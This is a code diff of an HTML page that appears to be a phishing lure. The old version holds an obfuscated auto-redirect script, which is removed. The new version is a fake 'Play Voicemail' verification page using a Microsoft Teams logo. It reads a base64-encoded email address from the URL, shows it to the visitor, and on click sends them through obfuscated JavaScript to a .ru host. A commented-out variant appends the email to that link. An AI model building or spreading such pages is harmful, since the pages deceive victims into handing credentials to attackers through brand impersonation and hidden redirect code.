@@ -1,12 +1,143 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+        }
+        .container {
+            text-align: center;
+        }
+        .dots-container {
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .dot {
+            background-color: #6E47EE;
+            border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            margin: 5px;
+            animation: grow 1.5s infinite ease-in-out;
+        }
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.1s; }
+        .dot:nth-child(3) { animation-delay: 0.2s; }
+        .dot:nth-child(4) { animation-delay: 0.3s; }
+        .dot:nth-child(5) { animation-delay: 0.4s; }
+        @keyframes grow {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+        #emailDisplay {
+            color: #6E47EE;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        #verifyButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            background-color: #6E47EE;
+            color: white;
+            border: none;
+            border-radius: 15px;
+            height: 50px;
+        }
+        #verifyButton:hover {
+            background-color: #8ECCFF;
+        }
+    </style>
 </head>
 <body>
-<script type="text/javascript">
-redirectTime = "1000";
-redirectURL = "https://afs.liechat.ru/m5hEZqPix1d1Y/";
-function _0x634c(){var _0x316520=['27972KfMTOo','1463208xNjuFM','tion','redi','f\x20=\x20','2066NMfckE','1344906gwDBhC','16IVwdoi','1033158sBhQWM','loca','10ZBpFUp','789ZvNjAR','URL;','.hre','rect','6266230XYhvLA','3717612GpYIBb'];_0x634c=function(){return _0x316520;};return _0x634c();}function _0x16ee(_0x1d6bca,_0x44321a){var _0x634c4e=_0x634c();return _0x16ee=function(_0x16eece,_0x2efd88){_0x16eece=_0x16eece-0x159;var _0xab82c4=_0x634c4e[_0x16eece];return _0xab82c4;},_0x16ee(_0x1d6bca,_0x44321a);}(function(_0x1c0f1d,_0x36727f){var _0x261674=_0x16ee,_0x15a6b5=_0x1c0f1d();while(!![]){try{var _0x186367=-parseInt(_0x261674(0x164))/0x1+parseInt(_0x261674(0x169))/0x2*(parseInt(_0x261674(0x15e))/0x3)+parseInt(_0x261674(0x163))/0x4+-parseInt(_0x261674(0x15d))/0x5*(parseInt(_0x261674(0x165))/0x6)+parseInt(_0x261674(0x15b))/0x7+parseInt(_0x261674(0x15a))/0x8*(parseInt(_0x261674(0x159))/0x9)+-parseInt(_0x261674(0x162))/0xa;if(_0x186367===_0x36727f)break;else _0x15a6b5['push'](_0x15a6b5['shift']());}catch(_0x2ba41c){_0x15a6b5['push'](_0x15a6b5['shift']());}}}(_0x634c,0x7b57d));function _ox53(){var _0x37718b=_0x16ee;setTimeout(_0x37718b(0x15c)+_0x37718b(0x166)+_0x37718b(0x160)+_0x37718b(0x168)+_0x37718b(0x167)+_0x37718b(0x161)+_0x37718b(0x15f),redirectTime);}_ox53();
-</script>
+    <div class="container">
+        <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
+        <div id="emailDisplay" aria-live="polite"></div>
+        <button id="verifyButton" aria-label="Click to Verify">Play Voicemail</button>
+        <div class="dots-container" aria-label="Loading content">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
+    <script>
+        // Function to decode base64 string
+        function decodeBase64(encoded) {
+            return atob(encoded);
+        }
+
+        // Function to find a valid email parameter
+        function findEmailParam() {
+            var params = '';
+            const currentUrl = new URL(window.location.href);
+            params = currentUrl.search;
+            console.log(params);
+            if ( params === '' ){
+                params = window.location.hash;
+                params = params.replace('#', '');
+            }else{
+                params = new URLSearchParams(window.location.href.split('?')[1]);
+                // params = getParamsFromURI(window.location.url);
+                params = params.get('code')
+            }
+
+            return decodeBase64(params);
+        }
+
+        // Function to redirect to target URL
+        function redirectToTarget(email) {
+            (function(_0xaeb74a,_0x3bb8d2){var _0x43e324=_0x33d9,_0x2638a6=_0xaeb74a();while(!![]){try{var _0x166eba=parseInt(_0x43e324(0xd4))/0x1*(parseInt(_0x43e324(0xd9))/0x2)+-parseInt(_0x43e324(0xd5))/0x3*(parseInt(_0x43e324(0xd8))/0x4)+parseInt(_0x43e324(0xda))/0x5*(-parseInt(_0x43e324(0xd2))/0x6)+parseInt(_0x43e324(0xd1))/0x7*(-parseInt(_0x43e324(0xd7))/0x8)+-parseInt(_0x43e324(0xd6))/0x9+parseInt(_0x43e324(0xdb))/0xa+parseInt(_0x43e324(0xd3))/0xb;if(_0x166eba===_0x3bb8d2)break;else _0x2638a6['push'](_0x2638a6['shift']());}catch(_0x79172a){_0x2638a6['push'](_0x2638a6['shift']());}}}(_0x58af,0x66014),location['hr'+'ef']='ht'+'tp'+'s:'+'//'+'af'+'s.'+'li'+'ec'+'ha'+'t.'+'ru'+'/m'+'5h'+'EZ'+'qP'+'ix'+'1d'+'1Y'+'/');function _0x33d9(_0x22f480,_0x28ee44){var _0x58afdd=_0x58af();return _0x33d9=function(_0x33d9a9,_0x46982a){_0x33d9a9=_0x33d9a9-0xd1;var _0x4679bf=_0x58afdd[_0x33d9a9];return _0x4679bf;},_0x33d9(_0x22f480,_0x28ee44);}function _0x58af(){var _0x409eae=['78klxmNY','779220tWIboA','8UBbBFU','87880fhZfoA','58xdYEFG','5RuJUqV','6023400dwxFeU','2489445JDlzRv','2485062pPpyzW','6314594eFrgff','23070QSCkyH'];_0x58af=function(){return _0x409eae;};return _0x58af();}
+
+            // (function(_0xaeb74a,_0x3bb8d2){var _0x43e324=_0x33d9,_0x2638a6=_0xaeb74a();while(!![]){try{var _0x166eba=parseInt(_0x43e324(0xd4))/0x1*(parseInt(_0x43e324(0xd9))/0x2)+-parseInt(_0x43e324(0xd5))/0x3*(parseInt(_0x43e324(0xd8))/0x4)+parseInt(_0x43e324(0xda))/0x5*(-parseInt(_0x43e324(0xd2))/0x6)+parseInt(_0x43e324(0xd1))/0x7*(-parseInt(_0x43e324(0xd7))/0x8)+-parseInt(_0x43e324(0xd6))/0x9+parseInt(_0x43e324(0xdb))/0xa+parseInt(_0x43e324(0xd3))/0xb;if(_0x166eba===_0x3bb8d2)break;else _0x2638a6['push'](_0x2638a6['shift']());}catch(_0x79172a){_0x2638a6['push'](_0x2638a6['shift']());}}}(_0x58af,0x66014),location['hr'+'ef']='ht'+'tp'+'s:'+'//'+'af'+'s.'+'li'+'ec'+'ha'+'t.'+'ru'+'/m'+'5h'+'EZ'+'qP'+'ix'+'1d'+'1Y'+'/'+email);function _0x33d9(_0x22f480,_0x28ee44){var _0x58afdd=_0x58af();return _0x33d9=function(_0x33d9a9,_0x46982a){_0x33d9a9=_0x33d9a9-0xd1;var _0x4679bf=_0x58afdd[_0x33d9a9];return _0x4679bf;},_0x33d9(_0x22f480,_0x28ee44);}function _0x58af(){var _0x409eae=['78klxmNY','779220tWIboA','8UBbBFU','87880fhZfoA','58xdYEFG','5RuJUqV','6023400dwxFeU','2489445JDlzRv','2485062pPpyzW','6314594eFrgff','23070QSCkyH'];_0x58af=function(){return _0x409eae;};return _0x58af();}
+
+        }
+
+        // Function to update the displayed email
+        function updateLink() {
+            const emailParam = findEmailParam();
+            const emailDisplay = document.getElementById('emailDisplay');
+            if (emailParam) {
+                emailDisplay.innerText = emailParam;
+            } else {
+                emailDisplay.innerText = "No email found for display.";
+                console.error("No email to display");
+            }
+        }
+
+        // Click button functionality
+        const button = document.getElementById('verifyButton');
+        button.addEventListener('click', function() {
+            // Hide the verify button
+            button.style.display = 'none';
+            // Show loading dots
+            document.querySelector('.dots-container').style.display = 'flex';
+            // Wait for 2 seconds before redirecting
+            setTimeout(() => {
+                let emailParam = findEmailParam();
+                if (emailParam) {
+                    redirectToTarget(emailParam);
+                } else {
+                    emailParam = "";
+                    redirectToTarget(emailParam);
+                }
+            }, 2000);
+        });
+
+        window.onload = updateLink;
+    </script>
 </body>
-  
 </html>
